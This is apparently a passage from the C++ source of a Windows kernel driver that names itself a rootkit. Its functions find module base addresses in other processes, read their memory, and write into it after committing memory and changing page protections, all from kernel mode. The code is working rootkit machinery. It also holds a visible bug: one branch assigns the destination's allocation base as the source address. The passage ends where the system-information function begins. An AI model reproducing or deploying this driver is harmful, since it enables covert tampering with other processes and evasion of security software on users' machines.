#include "requests.h"
#pragma warning(disable:4996)


/*
====================================================================
====================================================================
MEMORY FUNCTIONS THAT CORRELATE TO ROOTKIT REQUESTS, SPECIFIC FUNCS:
====================================================================
====================================================================
*/




NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver MODULE BASE REQUEST\n");

	RKSYSTEM_INFORET ModuleBaseRet = { 0 };
	UNICODE_STRING ModuleName = { 0 };
	KAPC_STATE ProcessState = { 0 };
	ANSI_STRING AS;
	PEPROCESS Process;
	PLDR_DATA_TABLE_ENTRY PrcEntry = NULL;  // An LDR entry of each iterated process, used to compare names to find process module
	PPEB_LDR_DATA PrcLdr = NULL;  // LDR data of the process
	PPEB PrcPeb = NULL;  // Process Environent Block of the process, used to get the LDR data

	// Check for invalid arguments -
	if (strcmp(RootkInst->MdlName, "") == 0 || RootkInst->MainPID == 0) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - INVALID MODULE NAME STRING (%s)/PID OF PROCESS MODULE (%hu)\n", RootkInst->MdlName, RootkInst->MainPID);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Process EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - CANNOT GET EPROCESS (%hu) :(\n", RootkInst->MainPID);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST PROCESS MODULE (%s, %hu)\n", RootkInst->MdlName, RootkInst->MainPID);


	// Get module name in a UNICODE_STRING format -
	RtlInitAnsiString(&AS, RootkInst->MdlName);
	RtlAnsiStringToUnicodeString(&ModuleName, &AS, TRUE);


	// Get process PEB for the base address -
	PrcPeb = PsGetProcessPeb(Process);
	if (!PrcPeb) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - COULD NOT GET PROCESS PEB :(\n");
		RootkInst->Out = NULL;
		RtlFreeUnicodeString(&ModuleName);
		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
	}
	

	// Get LDR data to iterate through -
	KeStackAttachProcess(Process, &ProcessState);  // Attach to the process
	PrcLdr = (PPEB_LDR_DATA)PrcPeb->Ldr;
	if (!PrcLdr) {
		KeUnstackDetachProcess(&ProcessState);  // Detach from the process
		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - NO LOADED MODULES AT ALL FOR PROCESS (LDR = NULL) :(\n");
		RootkInst->Out = NULL;
		RtlFreeUnicodeString(&ModuleName);
		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCLOADMDLS, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Iterate the process module's loader data to find the right module -
	for (PLIST_ENTRY list = (PLIST_ENTRY)PrcLdr->ModuleListLoadOrder.Flink; list != &PrcLdr->ModuleListLoadOrder; list = (PLIST_ENTRY)list->Flink) {
		PrcEntry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
		if (RtlCompareUnicodeString(&PrcEntry->BaseDllName, &ModuleName, TRUE) == NULL) {
			KeUnstackDetachProcess(&ProcessState);  // Detach from the process
			RootkInst->Out = PrcEntry->DllBase;
			RtlFreeUnicodeString(&ModuleName);
			DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST SUCCESS - MODULE (%s, %hu) WAS FOUND AT BASE ADDRESS = %p\n", RootkInst->MdlName, RootkInst->MainPID, RootkInst->Out);
			return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
		}
	}


	// The specified process module was not found -
	KeUnstackDetachProcess(&ProcessState);  // Detach from the process
	DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST FAILED - MODULE (%s, %hu) WAS NOT FOUND IN THE LDR DATA\n", RootkInst->MdlName, RootkInst->MainPID);
	RootkInst->Out = NULL;
	RtlFreeUnicodeString(&ModuleName);
	return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
}




NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST\n");

	PEPROCESS EpTo;
	PEPROCESS EpFrom;
	KAPC_STATE DstState;
	KAPC_STATE SrcState;
	MEMORY_BASIC_INFORMATION ToInfo = { 0 };
	MEMORY_BASIC_INFORMATION FromInfo = { 0 };
	NTSTATUS status;

	PVOID WriteToAddr = RootkInst->Out;
	PVOID WriteFromAddr = RootkInst->Buffer;
	ULONG64 WriteSize = RootkInst->Size;
	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
	SIZE_T AllocSize = ((WriteSize / PAGE_SIZE) + 1) * PAGE_SIZE;
	ULONG OldState = MEM_FREE;  // no importance for initial value
	BOOL WasCommitted = FALSE;
	BOOL CopyAttach = FALSE;  // FALSE = DST, TRUE = SRC
	PVOID SourceBuffer = NULL;
	PVOID TempBuffer = NULL;

	// Check for invalid arguments -
	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID ARGS SIZE (%zu)/SOURCE BUFFER (%p)/OUTPUT BUFFER (%p)\n", RootkInst->Size, RootkInst->Buffer, RootkInst->Out);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check for KM addresses (not allowed for this function) -
	if ((ULONG64)RootkInst->Out >= general::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= general::GetHighestUserModeAddrADD()) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - ONE OR MORE OF THE BUFFERS ARE IN SYSTEMSPACE (SOURCE BUFFER (%p)/OUTPUT BUFFER (%p))\n", RootkInst->Buffer, RootkInst->Out);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Destination EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpTo))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET DESTINATION EPROCESS (%hu) :(\n", RootkInst->MainPID);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Source EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpFrom))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET SOURCE EPROCESS (%hu) :(\n", RootkInst->SemiPID);
		return general::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SOURCE = (%s, %hu), DESTINATION = (%s, %hu)\n", RootkInst->MdlName, RootkInst->SemiPID, RootkInst->DstMdlName, RootkInst->MainPID);


	// Check if writing source can be read from (only when source = UM AND its not regular buffer, KM is always readable from here) -
	if (strcmp(RootkInst->MdlName, "regular") != 0) {
		KeStackAttachProcess(EpFrom, &SrcState);  // attach to the source process
		__try {
			ProbeForRead(WriteFromAddr, AllocSize, sizeof(UCHAR));
			status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
			KeUnstackDetachProcess(&SrcState);  // detach from the source process
			if (!NT_SUCCESS(status)) {
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT QUERY SOURCE VIRTUAL MEMORY TO VERIFY STATE\n");
				return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
			}
		}

		__except (STATUS_ACCESS_VIOLATION) {
			KeUnstackDetachProcess(&SrcState);  // detach from the source process
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY SOURCE OF WRITING\n");
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);

		}

		if (!(FromInfo.State & MEM_COMMIT)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE MEMORY REGION OF WRITING IS NOT COMMITTED IN MEMORY, CANNOT VERIFY IF WRITING FROM IT IS POSSIBLE\n");
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}

		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - CHECKING IF SOURCE ADDRESS NEEDS TO BE CHANGED OR NOT\n");
		if (FromInfo.AllocationBase == WriteFromAddr) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE ADDRESS DOES NOT NEED TO BE SWITCHED (%p, THE SAME AS FromInfo.AllocationBase)\n", WriteFromAddr);
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE ADDRESS SWITCHED FROM %p TO %p\n", WriteFromAddr, FromInfo.AllocationBase);
			WriteFromAddr = ToInfo.AllocationBase;
			RootkInst->Buffer = WriteFromAddr;
		}

		if (FromInfo.RegionSize < AllocSize) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE MEMORY RANGE SIZE (%zu) < REQUIRED SIZE TO WRITE FROM (%zu)\n", FromInfo.RegionSize, AllocSize);
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE MEMORY RANGE SIZE (%zu) >= REQUIRED SIZE TO WRITE FROM (%zu)\n", FromInfo.RegionSize, AllocSize);
	}
	if (strcmp(RootkInst->MdlName, "regular") == 0) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST REG-UM\n");
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UM-UM\n");
	}


	// Check if writing destination can be written into -
	// Query target address to check memory address range state (committed, reserved, free..) -
	KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
	__try {
		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
		status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
	}
	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY FST\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!NT_SUCCESS(status)) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - QUERY VIRTUAL MEMORY FAILED\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
	}


	OldState = ToInfo.State;
	if (((ULONG64)ToInfo.BaseAddress + ToInfo.RegionSize) < ((ULONG64)WriteToAddr + WriteSize)) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - WRONG SIZE + OUTPUT ADDRESS\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!(ToInfo.State & MEM_COMMIT)) {
		WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, ToInfo.AllocationBase, ZeroBits);
		if (WriteToAddr == NULL) {
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT COMMIT / NOT COMMITTED\n");
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}
		WasCommitted = TRUE;
	}
	else {
		if (AllocSize <= ToInfo.RegionSize) {
			DbgPrintEx(0, 0, "KMDFdriver WRITE REQUEST MEMORY AREA IS ALREADY COMMITTED WITH VALID SIZES (ALLOCBASE: %p, REGNSIZE: %zu, WRITESIZE: %zu)\n", ToInfo.AllocationBase, ToInfo.RegionSize, WriteSize);
			WriteToAddr = ToInfo.AllocationBase;
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver WRITE REQUEST MEMORY AREA IS ALREADY COMMITTED BUT INVALID SIZES (REGNSIZE: %zu, WRITESIZE: %zu)\n", ToInfo.RegionSize, WriteSize);
			status = ZwFreeVirtualMemory(ZwCurrentProcess(), &ToInfo.AllocationBase, &ToInfo.RegionSize, MEM_RELEASE);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(&DstState);  // detach from the destination process
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT RELEASE ALREADY MISMATCHING COMMITTED AREA\n");
				return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
			}

			WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
			if (WriteToAddr == NULL) {
				KeUnstackDetachProcess(&DstState);  // detach from the destination process
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT COMMIT / NOT COMMITTED NEW COMMITEMENT\n");
				return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
			}
			WasCommitted = TRUE;
			OldState = MEM_COMMIT;
		}
	}
	KeUnstackDetachProcess(&DstState);  // detach from the destination process
	RootkInst->Out = WriteToAddr;  // NOT INSIDE - C00..5 BECAUSE OF ATTACHING TO PROCESS


	// Query target address to check memory address range protection settings (access to memory) -
	KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
	status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);

	if (!NT_SUCCESS(status)) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		if (WasCommitted) {
			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}

		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - QUERY VIRTUAL MEMORY FAILED\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!(ToInfo.Protect & PAGE_EXECUTE_READWRITE || ToInfo.Protect & PAGE_READWRITE || ToInfo.Protect & PAGE_WRITECOPY || ToInfo.Protect & PAGE_EXECUTE_WRITECOPY) || ToInfo.Protect & PAGE_GUARD || ToInfo.Protect & PAGE_NOACCESS) {
		if (!ChangeProtectionSettingsADD(ZwCurrentProcess(), WriteToAddr, (ULONG)AllocSize, PAGE_READWRITE, ToInfo.Protect)) {
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
			if (WasCommitted) {
				general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
			}

			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DO NOT HAVE WRITE PERMISSIONS\n");
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOWRITEPRMS, STATUS_UNSUCCESSFUL, RootkInst);
		}
	}
	KeUnstackDetachProcess(&DstState);  // detach from the destination process


	// Copy virtual memory (r/u-u) -
	__try {
		KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
		KeUnstackDetachProcess(&DstState);  // detach from the destination process

		KeStackAttachProcess(EpFrom, &SrcState);  // attach to source process
		CopyAttach = TRUE;
		ProbeForRead(WriteFromAddr, WriteSize, sizeof(UCHAR));
		KeUnstackDetachProcess(&SrcState);  // detach from the source process
		CopyAttach = FALSE;
	}

	__except (STATUS_ACCESS_VIOLATION) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT WRITEABLE FOR MMCOPYVIRTUALMEMORY\n");
		if (CopyAttach) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DETACHING FROM SOURCE PROCESS..\n");
			KeUnstackDetachProcess(&SrcState);  // detach from the source process
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DETACHING FROM DESTINATION PROCESS..\n");
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
		}

		if (WasCommitted) {
			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);

	}


	// Get the source buffer into kernel mode -
	SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, WriteSize, 0x45674567);
	if (SourceBuffer == NULL) {
		if (WasCommitted) {
			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT ALLOCATE KERNEL MODE BUFFER TO GET USERMODE SOURCE BUFFER\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}

	status = UserToKernelMEM(EpFrom, WriteFromAddr, SourceBuffer, WriteSize, FALSE);
	if (!NT_SUCCESS(status)) {
		if (WasCommitted) {
			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET USERMODE SOURCE BUFFER INTO KERNEL MODE SOURCE BUFFER\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}

	// Print source usermode buffer value (as a string) to verify UM-KM -
	TempBuffer = ExAllocatePoolWithTag(NonPagedPool, WriteSize, 0x76547654);
	if (TempBuffer != NULL) {
		RtlCopyMemory(TempBuffer, SourceBuffer, WriteSize);
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCCEEDED GETTING SOURCE USERMODE BUFFER INTO KERNELMODE (%s)\n", (char*)TempBuffer);
		ExFreePool(TempBuffer);
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCCEEDED GETTING SOURCE USERMODE BUFFER INTO KERNELMODE, CANNOT ALLOCATE MEMORY FOR PRINTING BUFFER\n");
	}


	// Copying from UM-UM/REG-UM -
	status = KernelToUserMEM(EpTo, SourceBuffer, WriteToAddr, WriteSize, FALSE);
	if (WasCommitted) {
		general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
	}
	ExFreePool(SourceBuffer);

	if (!NT_SUCCESS(status)) {
		if (strcmp(RootkInst->MdlName, "regular") != 0) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - GetKernelToUser FAILED WHEN COPYING FROM REG-UM\n");
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - GetKernelToUser FAILED WHEN COPYING FROM KM-UM/UM-UM\n");
		}
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (strcmp(RootkInst->MdlName, "regular") != 0) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCEEDED (GetKernelToUser, KM-UM/UM-UM)\n");
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCEEDED (GetKernelToUser, REG-UM)\n");
	}

	return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST\n");

	PEPROCESS EpFrom;
	PEPROCESS EpTo;
	NTSTATUS status;
	KAPC_STATE SrcState;
	MEMORY_BASIC_INFORMATION FromInfo = { 0 };

	PVOID ReadToAddr = RootkInst->Out;
	PVOID ReadFromAddr = RootkInst->Buffer;
	ULONG64 ReadSize = RootkInst->Size;
	SIZE_T AllocSize = ((ReadSize / PAGE_SIZE) + 1) * PAGE_SIZE;
	PVOID SourceBuffer = NULL;
	PVOID TempBuffer = NULL;

	// Check for invalid arguments -
	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID ARGS SIZE (%zu)/SOURCE BUFFER (%p)/OUTPUT BUFFER (%p)\n", RootkInst->Size, RootkInst->Buffer, RootkInst->Out);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check for KM addresses (not allowed for this function) -
	if ((ULONG64)RootkInst->Out >= general::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= general::GetHighestUserModeAddrADD()) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - ONE OR MORE OF THE BUFFERS ARE IN SYSTEMSPACE (SOURCE BUFFER (%p)/OUTPUT BUFFER (%p))\n", RootkInst->Buffer, RootkInst->Out);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Get destination process EPROCESS to write into it -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpTo))) {
		DbgPrintEx(0, 0, "KMDFdriver BEFORE READ REQUEST FROM USER MODE - CANNOT GET READING DESTINATION EPROCESS (%hu)\n", RootkInst->SemiPID);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}

	// source process EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpFrom))) {
		DbgPrintEx(0, 0, "KMDFdriver BEFORE READ REQUEST FROM USER MODE - CANNOT GET READING SOURCE EPROCESS (%hu)\n", RootkInst->MainPID);
		return general::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver PERFORMING READ REQUEST FROM USER MODE\n");


	// Verify the source address and the memory region -
	__try {
		KeStackAttachProcess(EpFrom, &SrcState);  // attach to the source process
		ProbeForRead(ReadFromAddr, AllocSize, sizeof(UCHAR));
		status = ZwQueryVirtualMemory(ZwCurrentProcess(), ReadFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(&SrcState);
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - CANNOT QUERY TO VERIFY SOURCE\n");
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
		}
		KeUnstackDetachProcess(&SrcState);  // detach from the source buffer

		if (!(FromInfo.State & MEM_COMMIT)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE MEMORY REGION IS NOT COMMITTED, NOTHING TO READ\n");
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// If reading parameters are out of range: use allocation base -
		if ((ULONG64)ReadFromAddr + ReadSize > (ULONG64)FromInfo.AllocationBase + FromInfo.RegionSize) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - CHANGING READING ADDRESS FROM %p TO %p (ReadFromAddr + ReadSize IS OUT OF RANGE OF REGION)\n", ReadFromAddr, FromInfo.AllocationBase);
			ReadFromAddr = FromInfo.AllocationBase;
		}
		RootkInst->Buffer = ReadFromAddr;

		if (FromInfo.RegionSize < AllocSize) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE MEMORY REGION SIZE (%zu) < REQUESTED SIZE (%zu)\n", FromInfo.RegionSize, AllocSize);
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// Allocate source buffer -
		SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, ReadSize, 0X45674567);
		if (SourceBuffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - LOCAL KERNELMODE SOURCE BUFFER = NULL\n");
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// Get source buffer -
		status = UserToKernelMEM(EpFrom, ReadFromAddr, SourceBuffer, ReadSize, FALSE);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - COPYING SOURCE USERMODE TO KERNELMODE LOCAL BUFFER FAILED\n");
			ExFreePool(SourceBuffer);
			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// Try to verify the passing of the right values -
		TempBuffer = ExAllocatePoolWithTag(NonPagedPool, ReadSize, 0x76547654);
		if (TempBuffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - CANNOT ALLOCATE MEMORY FOR VERIFICATION TEMPORARY BUFFER\n");
		}
		else {
			RtlCopyMemory(TempBuffer, SourceBuffer, ReadSize);
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - VERIFICATION TEMPORARY BUFFER VALUE: %s\n", (char*)TempBuffer);
			ExFreePool(TempBuffer);
		}
	}
	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(&SrcState);
		if (SourceBuffer != NULL) {
			ExFreePool(SourceBuffer);
		}
		if (TempBuffer != NULL) {
			ExFreePool(TempBuffer);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Copy from local KM buffer to the destination UM buffer -
	status = KernelToUserMEM(EpTo, SourceBuffer, ReadToAddr, ReadSize, FALSE);
	ExFreePool(SourceBuffer);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - GetKernelToUser FAILED\n");
		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}

	DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST SUCCEEDED - GetKernelToUser SUCCEEDED\n");
	return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS PrintDbgMsgRK(ROOTKIT_MEMORY* RootkInst)
{
	DbgPrintEx(0, 0, "KMDFdriver PRINT MESSAGE REQUEST\n");
	DbgPrintEx(0, 0, "KMDFdriver Message: (%s)\n", RootkInst->MdlName);
	return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST\n");
